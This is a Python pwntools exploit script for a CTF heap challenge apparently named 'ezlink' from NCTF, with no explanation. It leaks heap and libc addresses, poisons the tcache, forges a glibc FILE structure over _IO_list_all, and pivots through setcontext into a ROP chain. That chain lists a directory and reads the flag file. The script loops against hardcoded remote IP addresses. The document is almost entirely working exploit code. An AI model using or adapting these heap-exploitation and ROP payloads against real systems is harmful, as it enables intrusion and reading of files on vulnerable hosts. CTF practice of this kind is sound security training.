from pwn import*
import time
context(os='linux',arch='amd64',log_level='debug')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(content):
	s.sendlineafter(b'>> ', b'1')
	s.sendafter(b'Please input your secret\n', content)

def delete():
	s.sendlineafter(b'>> ', b'2')

def show():
	s.sendlineafter(b'>> ', b'3')

def edit(content):
	s.sendlineafter(b'>> ', b'4')
	s.sendafter(b'Please input content\n', content)

def get_heap_base(target):
	start_time = time.time()
	base = 0x550000000000
	while(1):
		if(((base+0x1000)>>12) ^ (base+0x1590) == target):
			end_time = time.time()
			print(end_time-start_time)
			return base
		if(base == 0x560000000000):
			end_time = time.time()
			print(end_time-start_time)
			print('[-] get heap base failed')
			return 0xdeadbeef
		base+= 0x1000

def pwn():
	add(b'a')
	delete()
	add(b'\x00')
	show()
	s.recvuntil(b'you only have two chances to peep a secret\n')
	heap_base = u64(s.recv(6).ljust(8,b'\x00'))
	success(hex(heap_base))
	assert(heap_base & 0xff0000000000 == 0x550000000000)
	heap_base = get_heap_base(heap_base)
	assert(heap_base & 0xfff == 0)
	success('heap_base=>' + hex(heap_base))

	delete()
	edit(p64(((heap_base+0x1000)>>12)^(heap_base+0x300)))
	add(b'\x60')
	show()
	libc_base = u64(s.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x246d60
	success('libc_base=>' + hex(libc_base))

	pop_rax_ret = libc_base + 0x0000000000045eb0
	pop_rdi_ret = libc_base + 0x000000000002a3e5
	pop_rsi_ret = libc_base + 0x000000000002be51
	pop_rdx_ret_r12 = libc_base + 0x000000000011f497
	pop_rsp_ret = libc_base + 0x0000000000035732
	syscall_ret = libc_base + 0x0000000000091396

	rop_addr = heap_base
	orw_addr = heap_base
	fake_IO_addr = heap_base + 0x17e0

	fake_IO_file = p64(0) + p64(0)
	fake_IO_file+= p64(0)*3 + p64(1)                     # IO
	fake_IO_file+= p64(0)*7 + p64(0)                     # _chain
	fake_IO_file+= p64(0) + p64(0xffffffffffffffff) + p64(0)
	fake_IO_file+= p64(heap_base + 0x1000) + p64(0xffffffffffffffff) + p64(0)
	fake_IO_file+= p64(heap_base + 0x1e10 + 0x50 - 0xe0) # _wide_data
	fake_IO_file+= p64(0)*2 + p64(1) + p64(0)*5
	fake_IO_file+= p64(libc_base + libc.sym['_IO_wfile_jumps'])

	print(hex(len(fake_IO_file)))

	add(fake_IO_file[:0xd0])

	add(b'a')
	delete()
	edit(p64(((heap_base+0x1000)>>12)^(heap_base+0x18a0)))
	add(fake_IO_file[0xd0:])

	add(b'a')
	delete()
	edit(p64(((heap_base+0x1000)>>12)^(libc_base+libc.sym['_IO_list_all'])))
	add(p64(fake_IO_addr))

	payload = p64(libc_base + libc.sym['setcontext'] + 61) + p64(0)
	payload+= p64(heap_base + 0x1e10 + 0x58) + p64(pop_rdi_ret + 1)
	payload+= p64(0)*6
	payload+= p64(heap_base + 0x1e10 - 0x68)
	payload+= p64(pop_rdi_ret) + p64(0)
	payload+= p64(pop_rsi_ret) + p64(heap_base + 0x3000)
	payload+= p64(pop_rdx_ret_r12) + p64(0x500) + p64(0)
	payload+= p64(libc_base + libc.sym['read'])
	payload+= p64(pop_rsp_ret) + p64(heap_base + 0x3000)

	add(payload) # _wide_vtable

	# open
	orw = p64(pop_rdi_ret) + p64(heap_base + 0x3000 + 0x300)
	orw+= p64(pop_rsi_ret) + p64(0)
	orw+= p64(pop_rdx_ret_r12) + p64(0) + p64(0)
	orw+= p64(libc_base + libc.sym['open'])
	# getdents64
	orw+= p64(pop_rdi_ret) + p64(3)
	orw+= p64(pop_rsi_ret) + p64(heap_base + 0x5000)
	orw+= p64(pop_rdx_ret_r12) + p64(0x200) + p64(0)
	orw+= p64(pop_rax_ret) + p64(217)
	orw+= p64(syscall_ret)
	# write
	orw+= p64(pop_rdi_ret) + p64(1)
	orw+= p64(pop_rsi_ret) + p64(heap_base + 0x5000)
	orw+= p64(pop_rdx_ret_r12) + p64(0x200) + p64(0)
	orw+= p64(libc_base + libc.sym['write'])
	# open
	orw+= p64(pop_rdi_ret) + p64(heap_base + 0x5000 + 0xa3)
	orw+= p64(pop_rsi_ret) + p64(0)
	orw+= p64(pop_rdx_ret_r12) + p64(0) + p64(0)
	orw+= p64(libc_base + libc.sym['open'])
	# read
	orw+= p64(pop_rdi_ret) + p64(4)
	orw+= p64(pop_rsi_ret) + p64(heap_base + 0x6000)
	orw+= p64(pop_rdx_ret_r12) + p64(0x200) + p64(0)
	orw+= p64(libc_base + libc.sym['read'])
	# puts
	orw+= p64(pop_rdi_ret) + p64(heap_base + 0x6000)
	orw+= p64(libc_base + libc.sym['puts'])
	# exit
	orw+= p64(libc_base + libc.sym['exit'])
	
	orw = orw.ljust(0x300,b'\x00')
	orw+= b'.\x00'

	#gdb.attach(s)
	#pause()
	s.sendlineafter(b'>> ', b'5') # b _IO_wdoallocbuf

	sleep(1)
	s.sendline(orw)

	s.recvuntil(b'NCTF')
	success(b'NCTF' + s.recvuntil(b'}'))

	s.interactive()

while True:
	try:
		#s = process('./ezlink')
		s = remote('49.233.15.226', 8003)
		#s = remote('1.13.102.55', 8003)
		pwn()
	except:
		s.close()
		continue